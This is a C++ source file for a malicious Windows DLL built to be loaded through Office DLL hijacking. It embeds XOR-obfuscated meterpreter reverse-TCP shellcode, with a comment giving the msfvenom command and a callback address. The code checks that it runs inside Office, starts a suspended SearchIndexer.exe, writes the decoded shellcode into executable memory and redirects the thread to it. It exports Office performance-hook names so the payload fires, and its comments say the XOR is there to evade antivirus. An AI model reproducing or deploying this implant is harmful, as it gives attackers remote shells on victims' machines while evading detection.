﻿// Office DLL Hijacking
// Multi-byte character set using static libraries
// XOR to bypass AV

#include "stdafx.h"
#include <string>
#include <atlstr.h>

#include <tlhelp32.h>

//Payload of choice: 
//msfvenom -p windows/x64/meterpreter/reverse_tcp -e x86/countdown LHOST=192.168.102.129 LPORT=4444 -f c > payload.txt
//Copy into shellcode obfuscator 


std::string office1 = "Of";
std::string office2 = "f";
typedef BOOL(WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
LPFN_ISWOW64PROCESS fnIsWow64Process;
unsigned char key[] = { 'J' };

#ifdef _WIN64
unsigned char bits[] =
"\xf1\xb6\xf3\x02\x3a\xc9\x94\xae\x2e\xba\x8c\xa2\x0e\x82\x44\x4a"
"\x0e\x4a\x44\x4a\x4f\x0b\x54\x1b\x5f\x0b\x45\x1a\x5d\x18\x46"
"\x1b\x5a\x1c\x58\x02\x23\x7b\xbb\x98\x94\x2f\x96\x02\x57\xc1"
"\x4f\x18\x65\x2a\x67\x02\xa6\xc1\xbe\x18\xec\x52\xee\x02\x2f"
"\xc1\x37\x18\x5d\x6a\x5f\x02\x9e\xc1\xa6\x38\xbc\x1a\xbe\x02"
"\xfb\x45\x06\xfd\x06\x00\x06\x00\x01\x07\x7a\x7b\xf9\x83\xfb"
"\x02\x80\x7b\x0a\x8a\xec\xe6\x9a\x76\xb1\x2b\x87\x36\xcf\x48"
"\xa9\x66\xc3\x6a\xc8\x0b\x43\x8b\xc0\x83\x87\x47\x8c\x0b\xc7"
"\x4b\x4c\x8b\xe4\xa8\x43\xa7\x5b\x18\x50\x0b\x4b\x1b\x49\x02"
"\x88\xc1\x90\x18\xfa\x6a\x3b\xc1\x33\x08\x45\x76\x47\x02\x0c"
"\x4b\x96\x9a\xba\x2c\x71\xcb\x43\x32\x11\x52\x50\x41\x18\x48"
"\x27\x3f\x1f\x38\xde\xc1\x14\xca\xd6\xc2\x9c\x4a\xd6\x4a\x9c"
"\x4a\x9e\x02\x51\xcf\xdb\x8a\xe5\x3e\xc8\x2d\xca\x02\x81\x4b"
"\x1b\x9a\x01\x1a\xc0\xc1\xc2\x02\x90\x52\x9e\x0e\x5f\xc1\x55"
"\x0a\x3f\x6a\x3c\x03\x77\x4b\xed\x9a\x44\xa9\x58\x1c\x5a\x02"
"\xef\xb5\x6c\x83\x67\x0b\xa6\xc1\xd8\x7e\x1a\xc2\x18\x02\x53"
"\x4b\xcf\x9c\xc8\x07\xb3\x7b\x30\x83\x32\x02\x49\x7b\xc3\x8a"
"\x25\xe6\x2e\x0b\xa5\x8b\x26\x83\x61\x47\x6a\x0b\x21\x4b\xaa"
"\x8b\xd8\x72\x72\xaa\x4d\x3f\xf6\xbb\xf0\x06\xb9\x49\xbf\x06"
"\xd1\x6e\x93\x42\x9c\x0f\xef\x73\x74\x9b\x4b\x3f\xd9\x92\xcb"
"\x12\xc5\x0e\x04\xc1\x0e\x0a\x60\x6e\x63\x03\x28\x4b\xb2\x9a"
"\x9e\x2c\x95\x0b\x54\xc1\x12\x46\x10\x02\x1e\x0e\xdf\xc1\xd5"
"\x0a\x83\x56\x80\x03\xcb\x4b\x51\x9a\x5a\x0b\x9b\xc1\xd5\x4e"
"\x17\xc2\x15\x02\x5e\x4b\xc4\x9a\xcf\x0b\xdd\x12\xd6\x0b\xc4"
"\x12\xd0\x14\xc3\x13\xd3\x10\xd8\x0b\xca\x12\xc1\x0b\xd2\x13"
"\xd9\x0b\xc9\x10\xcb\x02\x02\xc9\xa4\xa6\xce\x6a\xc5\x0b\xdd"
"\x18\x68\xb5\xc2\xaa\xd0\x12\xdb\x0b\xc8\x13\xd8\x10\xda\x02"
"\x1b\xc1\x43\x58\xe0\xa3\xe5\x05\x50\xb5\xe5\xb5\x50\xb5\x47"
"\x17\x67\x20\x2d\x4a\x2e\x03\xda\xf4\xe7\x3d\xc4\x23\xe0\x24"
"\xc3\x23\xe7\x24\xc8\x2f\xf6\x3e\xbc\x4a\xb7\x0b\xab\x1c\xa8"
"\x03\x6b\xc3\xc7\xac\xc1\x06\x02\xc3\xb9\xbb\xb2\x0b\x42\xf0"
"\x44\x06\x79\x3d\x15\x6c\x58\x4d\xed\xb5\x72\x9f\x70\x02\x0b"
"\x7b\x88\x83\x8a\x02\xf1\x7b\x69\x98\x6e\x07\x15\x7b\x9f\x8a"
"\x98\x07\xe3\x7b\x60\x83\x6b\x0b\x71\x1a\x7a\x0b\x60\x1a\x6b"
"\x0b\x9b\xf0\xeb\x70\xf7\x1c\xc4\x33\x29\xed\x9c\xb5\x03\x9f"
"\xa0\xa3\x79\xd9\x33\x4a\x79\x4a\x33\x4a\x23\x10\x21\x02\xe2"
"\xc3\x69\x8b\x62\x0b\x90\xf2\x61\xf1\x2a\x4b\x60\x4a\x2a\x4a"
"\x2d\x07\x56\x7b\xd5\x83\xde\x0b\xc5\x1b\xce\x0b\xd5\x1b\xf5"
"\x20\xbc\x49\xb7\x0b\xac\x1b\xa7\x0b\x57\xf0\x4a\x1d\x89\xc3"
"\x5c\xd5\xd0\x8c\x65\xb5\xfa\x9f\x5b\xa1\x68\x33\x79\x11\x7b"
"\x02\xb8\xc3\x33\x8b\x31\x02\x4a\x7b\xd2\x98\xd1\x03\x12\xc3"
"\x80\x92\x87\x07\xfc\x7b\x7f\x83\x67\x18\x45\x22\x0f\x4a\x77"
"\x78\x9d\xea\x53\xce\x4b\x18\x53\x18\x58\x0b\xa8\xf0\x09\xa1"
"\x16\x1f\x72\x64\x03\x71\xb6\xb5\x29\x9f\x2b\x02\xe8\xc3\x64"
"\x8c\x66\x02\xaf\xc9\x26\x89\x3c\x1a\x1c\x20\x5c\x40\x49\x15"
"\x4b\x02\x88\xc3\x33\xbb\xc3\xf0\x96\x55\xdc\x4a\x96\x4a\xdc"
"\x4a\xfc\x20\xb6\x4a\x94\x22\x5e\xca\x27\x79\x6d\x4a\x27\x4a"
"\x24\x03\xe7\xc3\x4d\xaa\x46\x0b\xb5\xf3\xfb\x4e\xb1\x4a\xfb"
"\x4a\xb1\x4a\xba\x0b\x4a\xf0\x75\x3f\x79\x0c\xad\xd4\x61\xcc"
"\xd4\xb5\x4b\x9f\x49\x02\x8a\xc3\x31\xbb\x33\x02\xf0\xc3\x60"
"\x90\x63\x03\xee\x8d\x64\x8a\xd1\xb5\x64\xb5\xd1\xb5\x64\xb5"
"\x63\x07\x18\x7b\x9b\x83\x83\x18\x9b\x18\x90\x0b\x60\xf0\x07"
"\x67\x4b\x4c\x19\x52\x28\x31\x9d\xb5\x02\x9f\xcd\xcf\x47\x8a"
"\x02\x45\xcd\xcf\x1a\xd7\x51\x4b\x1b\x4a\x51\x4a\x53\x02\xe6"
"\xb5\x63\x85\x26\x45\xe8\xce\x2e\xc6\x65\x4b\x2f\x4a\x65\x4a"
"\xc4\xa1\x3d\xf9\x9e\xa3\x30\xae\x7b\x4b\x31\x4a\x7b\x4a\xd9"
"\xa2\x11\xc8\xa4\xb5\x11\xb5\xa4\xb5\xc1\x65\xf3\x32\xd4\x27"
"\xda\x0e\xa4\x7e\xee\x4a\xb2\x5c\x98\x2a\x30\xa8\x94\xa4\x61"
"\xf5\x76\x17\x89\xff\x2c\xa5\x1a\x36\x7f\x65\xda\xa5\xf0\x2a"
"\x4b\xbb\x42\x09\x1c\x5e\x19\x05\xdf\xc6\x53\x8c\x99\xca\x57"
"\xce\xb2\xe5\x0c\xbe\xda\xd6\xc7\x1d\x7e\xb9\x47\x39\x26\x61"
"\x0a\x2c\x90\x9a\x31\xa1\x24\x15\x80\xa4\xf7\x77\x73\x84\x9b"
"\xe8\x1e\x85\x21\x3f\x60\x41\xa5\xc5\x42\xe7\x85\xc7\x90\x15"
"\x92\x02\xa8\x3a\x18\xb0\x1f\x07\x1e\x01\xc8\xd6\x4b\x83\x47"
"\x0c\x1c\x5b\xc8\xd4\x04\xcc\xa0\xa4\x52\xf2\xd6\x84\x37\xe1"
"\xb4\x83\x6e\xda\x9c\xf2\x48\xd4\x85\xcd\x3d\xb8\xbf\x82\x04"
"\xbb\xcd\xc9\xed\x20\xb5\x58\x37\x82\x29\x1e\x43\x6a\x64\x27"
"\x75\x11\x3f\x4a\x20\x1f\x19\x39\x36\x2f\x0e\x38\x69\x67\x62"
"\x0b\x4f\x2d\x60\x2f\x44\x24\x7a\x3e\x0a\x70\x60\x6a\x67\x07"
"\x42\x25\x72\x30\x51\x23\x77\x26\x51\x26\x7a\x2b\x1f\x65\x60"
"\x7f\x04\x64\x7e\x7a\x14\x6a\x76\x62\x6b\x1d\x48\x23\x6c\x24"
"\x42\x2e\x67\x25\x5a\x3d\x63\x39\x09\x6a\x0d\x04\x13\x1e\x79"
"\x6a\x05\x7c\x61\x64\x1a\x7b\x6b\x71\x01\x6a\x1c\x1d\x19\x05"
"\x04\x1d\x78\x7c\x06\x7e\x77\x71\x1d\x6a\x03\x1e\x3b\x38\x18"
"\x23\x36\x2e\x19\x2f\x3d\x24\x03\x3e\x66\x65\x1b\x7d\x7f\x64"
"\x05\x7a\x74\x71\x1e\x6a\x26\x38\x1a\x3c\x6a\x70\x11\x7b\x6a"
"\x7b\x0e\x64\x74\x7a\x17\x63\x7d\x6a\x5b\x26\x78\x23\x59\x21"
"\x76\x2f\x1c\x6a\x11\x0d\x3e\x2f\x17\x29\x36\x21\x13\x25\x54"
"\x47\x14\x40\x5e\x4a\x37\x69\xf0\xc7\x10\xe0\x4e\x5e\x3d\x73"
"\xb5\x88\xf8\x4d\x9b\x63\x04\x9f\x47\x43\xcc\x8b\xe1\x2d\x61"
"\x80\x4a\x2b\xa3\xe9\x7b\xd8\xb8\xc3\x6c\xd4\xb3\xdf\x03\xb0"
"\xd6\xd5\xad\x7b\xf2\x5f\x0a\xf8\x4f\x45\xe7\xa8\xb9\x5e\x85"
"\x3c\xb0\x35\x61\xd1\x69\x08\xfa\x93\x16\xec\xc1\xd7\x6c\xad"
"\xc8\xa4\xf6\x3e\xef\x19\xc4\x2b\xa7\x63\x56\xf1\xbd\xeb\xd0"
"\x6d\x26\xf6\xb2\x94\xc5\x77\x00\xc5\x85\x85\x03\x86\x40\x43"
"\xec\xac\x22\xce\xa8\x8a\x83\x2b\x5c\xdf\xa6\xfa\xa7\x01\xd1"
"\x76\x59\x88\x3a\x63\x3f\x05\xb7\x88\x6d\xda\xb2\xdf\x90\x22"
"\xbf\x2f\xee\x51\xe6\x08\xf2\x14\xbe\x4c\xa7\x19\x71\xd6\xa9"
"\xd8\x6d\xc4\x73\x1e\xbf\xcc\xf9\x46\x5a\xa3\x82\xd8\x9d\x1f"
"\xd9\x44\x5a\x83\xe0\xba\x12\xf2\x1f\x0d\x74\x6b\xe9\x9d\x5a"
"\xb3\x39\x63\x90\xa9\x30\xa0\xc3\xf3\x38\xfb\xb2\x8a\x9c\x2e"
"\x7f\xe3\xfb\x84\x48\xb3\xfa\xb2\xd4\x2e\xcb\x1f\xad\x66\xe0"
"\x4d\xa7\x47\xe7\x40\xe8\x0f\xa3\x4b\x6c\xcf\x39\x55\xaf\x96"
"\x1d\xb2\x53\x4e\xd2\x81\x44\x96\x3f\x7b\xb2\x8d\xc8\x7a\xbd"
"\x75\xfc\x41\xca\x36\xed\x27\x13\xfe\xcc\xdf\x30\xfc\xbc\x8c"
"\x99\x25\x28\xb1\x03\x2b\x09\x0a\x56\x5f\x2f\x79\x27\x08\x51"
"\x76\x4b\x1a\x62\x29\x41\x23\x3e\x7f\x2a\x14\x13\x39\xa8\xbb"
"\x96\x3e\x9b\x0d\xae\x35\x49\xe7\xc4\x8d\x42\x86\x50\x12\xce"
"\x9e\x70\xbe\xcf\xbf\xdb\x14\xef\x34\x06\xe9\x69\x6f\xc4\xad"
"\x43\x87\xec\xaf\x88\x64\xbe\x36\x94\x2a\x92\x06\xf3\x61\xb6"
"\x45\xd6\x60\x51\x87\x97\xc6\x54\xc3\xe5\xb1\xa9\x4c\x35\x9c"
"\x04\x31\x58\x5c\x6e\x36\x4b\x25\xa6\xed\x06\xa0\x6b\x6d\xfb"
"\x90\x2c\xd7\x5c\x70\x51\x0d\x22\x73\x32\x10\xfc\xce\x04\xf8"
"\xe6\xe2\xe9\x0f\x9a\x73\xf9\x63\x8d\x74\xc6\x4b\x46\x80\x14"
"\x52\xe5\xf1\x60\x85\x03\x63\xc5\xc6\x64\xa1\x73\x17\x50\x23"
"\xcf\x9f\x93\x5c\x4d\xde\x85\xc8\xd0\x55\x0a\xda\x9d\x97\x4b"
"\xd6\xec\xa7\xa2\x4e\xff\x5d\x36\xc9\x77\x41\x16\x61\x3d\x2b"
"\x89\xb4\x61\xe8\xc7\xa6\xc1\x06\xc7\x06\x8d\x4a\x86\x0b\x72"
"\xf4\xc8\xba\x37\xff\xdf\xe8\xc3\x1c\x76\xb5\xe9\x9f\xeb\x02"
"\x90\x7b\x13\x83\xe3\xf0\xa9\x4a\xe3\x4a\xe9\x0a\xa3\x4a\xa8"
"\x0b\x5a\xf2\x10\x4a\x4a\x5a\x00\x4a\x4a\x4a\x41\x0b\xb2\xf3"
"\xb8\x0a\xf2\x4a\xb8\x4a\xf2\x4a\xf9\x0b\x09\xf0\x1b\x12\xf5"
"\xee\xec\x19\x43\xaf\xf6\xb5\x69\x9f\x6b\x02\xb2\xd9\xab\x19"
"\xb2\x19\xb0\x02\x73\xc3\xde\xad\xdc\x02\x1f\xc3\xa4\xbb\xa6"
"\x02\x65\xc3\xf5\x90\xfe\x0b\x0c\xf2\x46\x4a\x2c\x6a\x66\x4a"
"\x2c\x4a\x2f\x03\xec\xc3\x5f\xb3\x54\x0b\xa4\xf0\xfc\x58\x20"
"\xdc\xe3\xc3\x4b\xa8\xfe\xb5\x61\x9f\x63\x02\xaa\xc9\x24\x8e"
"\x4e\x6a\x81\xcf\x0b\x8a\x35\x3e\xc9\xfc\xe5\x2c\x24\xc1\x69"
"\x4d\x6b\x02\x20\x4b\xa9\x89\x66\xcf\xec\x8a\xd3\x3f\x4e\x9d"
"\x5c\x12\x4e\x12\x5c\x12\x5e\x02\x11\x4f\x5b\x4a\x11\x4a\x5b"
"\x4a\x11\x4a\x0b\x1a\x82\x89\x20\xa2\x15\x35\xa2\xb7\x17\xb5"
"\xa2\xb5\x9e\x3c\xbd\x23\x87\x3a\xa8\x2f\x90\x38\xbc\x2c\x9f"
"\x23\xa6\x39\x84\x22\xe3\x67\x98\x7b\xeb\x73\x97\x7c\xea\x7d"
"\x91\x7b\xef\x7e\x8b\x64\xa0\x2b\x9a\x3a\xa0\x3a\x99\x39\xa3"
"\x3a\x86\x25\xb8\x3e\xdc\x64\xf5\x29\xd0\x25\xf7\x27\xbd\x4a"
"\xc0\x7d\x0d\xcd\x7f\x72\xfa\x85\xb0\x4a";

#else

unsigned char bits[] =
"\xb4\xf3\xb2\x06\xf9\x4b\xb3\x4a\xf9\x4a\x5b\xa2\xee\xb5\x5b\xb5"
"\xee\xb5\x5b\xb5\xd0\x8b\xc4\x14\xbe\x7a\xb8\x06\xfc\x44\xb1"
"\x4d\x19\xa8\xa9\xb0\x1e\xb7\xbe\xa0\x75\xcb\x3b\x4e\x74\x4f"
"\x38\x4c\x15\x2d\xde\xcb\x78\xa6\x09\x71\x88\x81\xaa\x22\x66"
"\xcc\x72\x14\x07\x75\xd6\xd1\xdf\x09\x8b\x54\x59\xd2\x55\x0c"
"\x1e\x4b\xc9\xd7\xe6\x2f\x9c\x7a\xc0\x5c\x27\xe7\x3c\x1b\x4c"
"\x70\x2a\x66\x81\xab\x78\xf9\x2e\x56\x24\x0a\x30\x14\x5b\x6b"
"\x19\x42\x56\x4f\xfb\xad\x59\xa2\x36\x6f\x54\x62\xf3\xa7\x70"
"\x83\xe4\x94\xd1\x35\xe2\x33\x0c\xee\x24\x28\x4f\x6b\xbc\xf3"
"\x8f\x33\xcd\x42\x39\xf4\x09\x30\x65\x6c\x6f\x0a\xff\x90\xc7"
"\x38\xb7\x70\x10\xa7\x36\x26\xc9\xff\xe5\x2c\xcf\x2a\xc5\x0a"
"\x1e\xdb\x9c\x82\xdb\x47\xcc\x17\x23\xef\x14\x37\x5f\x4b\xd7"
"\x88\xe3\x34\x69\x8a\x6e\x07\xbf\xd1\x8a\x35\x70\xfa\xc6\xb6"
"\x1c\xda\xcb\xd7\xdf\x14\xc0\x1f\x18\xd8\x3c\x24\xc1\xfd\xa6"
"\x67\x43\xe5\x50\x13\x3c\x6c\xd2\xee\xfe\x2c\x97\x69\xa6\x31"
"\xf9\x5f\x36\xcf\x46\x70\xe4\xa2\x92\x76\x99\x0b\xb4\x2d\x4a"
"\xfe\x0e\x44\xa6\xa8\x8a\x2c\xe0\x6a\x4d\xad\x32\x7f\x0a\x38"
"\x2e\x24\xc7\xe9\x77\xb0\x4b\x3c\xf9\xb2\xc6\x3f\x29\xef\x9c"
"\xb5\xe5\x79\xf3\x16\xe4\x17\x8f\x6b\xe5\x6a\xb2\x57\xdc\x6e"
"\xb2\x6e\xd6\x64\xe3\x35\xc8\x2b\x5f\x97\xc9\x96\x5d\x94\x19"
"\x44\xc7\xde\xe1\x26\xae\x4f\x30\x9e\x98\xa8\x6a\xf2\x9e\xf4"
"\x59\xc7\x9d\xc4\x30\xad\x9d\xad\x35\xa8\xdf\xea\x59\x86\xd3"
"\x8a\x64\xb7\xf4\x90\x5e\xaa\xaa\xf4\x7e\xd4\x51\x2f\x55\x04"
"\x3b\x6e\x7c\x47\xa9\xd5\x7c\xd5\x96\xea\x54\xc2\x78\x2c\xc5"
"\xbd\x7b\xbe\xfc\x87\x39\xc5\x54\x6d\xdd\x89\x3e\xe3\x21\x1f"
"\x15\x34\x99\x8c\x74\xed\xf8\x8c\xdd\x25\x8f\x52\xce\x41\xa7"
"\x69\x36\x91\xca\xfc\x35\xff\xd8\xed\x79\xa1\x02\x7b\x17\x15"
"\xb7\xa0\x16\xa1\xb0\xa6\x17\xa7\xa3\xb4\x06\xa5\xcc\xca\x17"
"\xdb\xf7\xe0\x94\x63\x15\x81\x45\x50\x29\x6c\x5b\x72\x0c\x57"
"\x18\x14\xf2\xea\x63\x91\xb3\xd0\x63\xd0\x8f\xec\x93\x1c\xac"
"\x3f\x43\xef\xba\xf9\xdc\x66\x97\x4b\x8d\x1a\xd1\x5c\x38\xe9"
"\xa0\x98\xcc\x6c\x12\xde\x8b\x99\x68\xe3\x13\x7b\x6f\x7c\x9b"
"\xf4\x31\xaa\x9a\xab\x32\xa8\xf1\xc3\x5f\xae\x9a\xc5\x32\xa8"
"\xc9\xfb\x3c\xf5\xf7\xcb\x55\xa2\x2d\x78\x43\x6e\xbb\xf8\xe0"
"\x5b\x90\x70\xa9\x39\xea\x43\x52\xb8\x95\xc7\x1d\x88\x29\x34"
"\xa3\x8a\x74\xd7\x86\xf2\x5d\xdb\xed\xb0\x4c\xa1\xfa\xb6\x4d"
"\xb7\xaf\xe2\x70\xdf\x3a\x4a\x19\x23\x09\x10\xe4\xed\xf9\x1d"
"\x53\xaa\xe0\xb3\x78\x98\xa9\xd1\xb9\x10\x93\x2a\xd2\x41\xc2"
"\x10\xd6\x14\xc5\x13\xe8\x2d\xb0\x58\x32\x82\xa2\x90\xa4\x06"
"\x05\xa1\x8f\x8a\x50\xdf\xf5\xa5\xa7\x52\x89\x2e\xfb\x72\xf2"
"\x09\xcc\x3e\x9b\x57\x8f\x14\xda\x55\xb0\x6a\xb1\x01\xd9\x68"
"\xe0\x39\xe6\x06\x82\x64\xc1\x43\xa3\x62\xf1\x52\x6d\x9c\xd8"
"\xb5\xee\x36\xe0\x0e\xf2\x12\xf8\x0a\xd0\x28\xcb\x1b\x4f\x84"
"\xe2\xad\xc5\x27\xe5\x20\x65\x80\x15\x70\x4c\x59\xd7\x9b\xd5"
"\x02\x5a\x8f\xd4\x8e\x5d\x89\x2b\x76\x9c\xb7\xc0\x5c\x0c\xcc"
"\x72\x7e\xbd\xcf\x77\xca\xc2\xb5\x3d\xff\x84\xb9\x2b\xaf\x7f"
"\x54\x16\x69\x16\x00\x44\x52\xbd\xf9\x6f\xd2\x25\x4a";
#endif

unsigned long shsize = 2048;

const int size = sizeof bits;


bool ExtractProcessOwner(HANDLE hProcess_i,
	CString& csOwner_o)
{
	
	// Get process token
	HANDLE hProcessToken = NULL;
	if (!::OpenProcessToken(hProcess_i, TOKEN_READ, &hProcessToken) || !hProcessToken)
	{
		return false;
	}

	// First get size needed, TokenUser indicates we want user information from given token
	DWORD dwProcessTokenInfoAllocSize = 0;
	::GetTokenInformation(hProcessToken, TokenUser, NULL, 0, &dwProcessTokenInfoAllocSize);

	// Call should have failed due to zero-length buffer.
	if (::GetLastError() == ERROR_INSUFFICIENT_BUFFER)
	{
		// Allocate buffer for user information in the token.
		PTOKEN_USER pUserToken = reinterpret_cast<PTOKEN_USER>(new BYTE[dwProcessTokenInfoAllocSize]);
		if (pUserToken != NULL)
		{
			// Now get user information in the allocated buffer
			if (::GetTokenInformation(hProcessToken, TokenUser, pUserToken, dwProcessTokenInfoAllocSize, &dwProcessTokenInfoAllocSize))
			{
				// Some vars that we may need
				SID_NAME_USE   snuSIDNameUse;
				TCHAR          szUser[MAX_PATH] = { 0 };
				DWORD          dwUserNameLength = MAX_PATH;
				TCHAR          szDomain[MAX_PATH] = { 0 };
				DWORD          dwDomainNameLength = MAX_PATH;

				// Retrieve user name and domain name based on user's SID.
				if (::LookupAccountSid(NULL,
					pUserToken->User.Sid,
					szUser,
					&dwUserNameLength,
					szDomain,
					&dwDomainNameLength,
					&snuSIDNameUse))
				{
					// Prepare user name string
					csOwner_o = _T("\\\\");
					csOwner_o += szDomain;
					csOwner_o += _T("\\");
					csOwner_o += szUser;

					// We are done!
					CloseHandle(hProcessToken);
					delete[] pUserToken;

					// We succeeded
					return true;
				}
			}

			delete[] pUserToken;
		}
	}

	CloseHandle(hProcessToken);

	// Oops trouble
	return false;
}// End GetProcessOwner

bool CheckIfRunning() {
	bool safetoexec = false;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	CString csOwner_o = "";

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	char username[256 + 1];
	DWORD username_len = 256 + 1;
	GetUserName(username, &username_len);

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			if (_stricmp(entry.szExeFile, "SearchIndexer.exe") == 0)
			{
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);

				ExtractProcessOwner(hProcess, csOwner_o);
				if (csOwner_o != ""  && csOwner_o.Find(username) != -1)
				{
					safetoexec = false;
				}
				else
				{
					safetoexec = true;
				}
				CloseHandle(hProcess);
			}
		}
	}
	CloseHandle(snapshot);
	return safetoexec;
}

bool SafetoExecute()
{
	bool safetoexec = false;
	WCHAR path[MAX_PATH] = { 0 };
	GetModuleFileNameW(NULL, path, MAX_PATH);
	std::wstring ws(path);
	std::string fullpath(ws.begin(), ws.end());
	std::string office3 = "ic";
	std::string office4 = "e";
	std::size_t found3 = fullpath.find(office1 + office2 + office3 + office4);
	SetEnvironmentVariable(TEXT("pathinfoV"), fullpath.c_str());
	CheckIfRunning();
	if (found3 != std::string::npos)
	{
		safetoexec = CheckIfRunning();
	}
	return safetoexec;
}


/* hand-rolled bzero allows us to avoid including ms vc runtime */
void bzero_cust(void *p, size_t l)
{

	BYTE *q = (BYTE *)p;
	size_t x = 0;
	for (x = 0; x < l; x++)
		*(q++) = 0x00;
}

//XORPayloadFunction
//e is the xor'ed payload
//k is the key
//d is the returned payload
void XORandDrop(unsigned char* e, char k, unsigned char* d)
{
	int j = 0;
	for (int i = 1; i < size; i = i + 2)
	{
		d[j] = e[i] ^ k;
		j++;
	}
	
}

void ExecPay(void) {
	char process[40];
	strncpy_s(process,"SearchIndexer.exe", sizeof(process) - 1);
	PROCESS_INFORMATION prosinf;
	STARTUPINFO startinf;
	CONTEXT contx;
	LPVOID rp;
	unsigned char d[size/2];
	
	// Start up the payload in a new process
	bzero_cust(&startinf, sizeof(startinf));
	startinf.cb = sizeof(startinf);

	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
	if (CreateProcess(0, process, 0, 0, 0, CREATE_SUSPENDED | IDLE_PRIORITY_CLASS, 0, 0, &startinf, &prosinf)) {
		contx.ContextFlags = CONTEXT_INTEGER | CONTEXT_CONTROL;
		GetThreadContext(prosinf.hThread, &contx);

		rp = (LPVOID)VirtualAllocEx(prosinf.hProcess, NULL, shsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		
		XORandDrop(bits, key, d);

		WriteProcessMemory(prosinf.hProcess, (PVOID)rp, &d, shsize, 0);

		#ifdef _WIN64
				contx.Rip = (DWORD64)rp;
		#else
				contx.Eip = (DWORD)rp;
		#endif

		SetThreadContext(prosinf.hThread, &contx);

		ResumeThread(prosinf.hThread);
		CloseHandle(prosinf.hThread);
		CloseHandle(prosinf.hProcess);
	}
	return;
}

void PrepPay(void)
{
	bool safetoexec = false;
	PROCESS_INFORMATION processInformation = { 0 };
	STARTUPINFO startupInfo = { 0 };
	BOOL result = true;
	int valueLength = 512;
	TCHAR* envVarValue = new TCHAR[valueLength];
	DWORD len = NULL;
	safetoexec = SafetoExecute();

	if (safetoexec)
	{
		PROCESS_INFORMATION processInformation = { 0 };
		STARTUPINFO startupInfo = { 0 };
		BOOL result = true;
		int valueLength = 512;
		TCHAR* envVarValue = new TCHAR[valueLength];
		DWORD len = NULL;

		//Uses environment variable to stop multiple executions per document open.
		//It will still run once for every document opened
		len = GetEnvironmentVariable("PROCESSOR_CORES", envVarValue, valueLength);
		if (!len)
		{
		
			ExecPay();
			//#ifdef _DEBUG
				//result = CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, "C:\\Windows\\System32", &startupInfo, &processInformation);
			//#endif

			SetEnvironmentVariable((TEXT("PROCESSOR_CORES")), (TEXT("1")));

		}
	}
	return;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	PROCESS_INFORMATION processInformation = { 0 };
	STARTUPINFO startupInfo = { 0 };
	switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		//CreateProcess("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, "C:\\", &startupInfo, &processInformation);
		#ifdef _WIN32
		
		PrepPay();
		#endif
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

#ifdef _WIN64
//Exploit moved to extern for safer execution
extern "C" __declspec(dllexport) void GetPerfhostHookVersion()
{
	PrepPay();
	return;

}

extern "C" __declspec(dllexport) void _PerfCodeMarker()
{
	PrepPay();
	return;
}


extern "C" __declspec(dllexport) void _UnInitPerf()
{
	PrepPay();
	return;
}

#endif

/*
switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
//fireLazor();
len = GetEnvironmentVariable(L"Run", envVarValue, valueLength);
if (!len)
{
result = CreateProcess(L"C:\\Windows\\System32\\cmd.exe", szCmdline, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows\\System32", &startupInfo, &processInformation);
SetEnvironmentVariable(_tcsdup(TEXT("Run")), _tcsdup(TEXT("1")));
}
return FALSE;
case DLL_THREAD_ATTACH:

case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:

break;
}
//fireLazor();
return FALSE;
}




extern "C" __declspec(dllexport) void AInitNeverRun()
{
wastetime();
}



extern "C" __declspec(dllexport) void PerfCodeMarker()
{
	fireLazor();
}


extern "C" __declspec(dllexport) void UnInitPerf()
{
	fireLazor();
}

void wastetime()
{
int d = 1, e = 2;
signed long long int limit = 600851475143;
for (int i = 0; i < limit; i++)
{
d = i / (10 * i);
}

}
*/
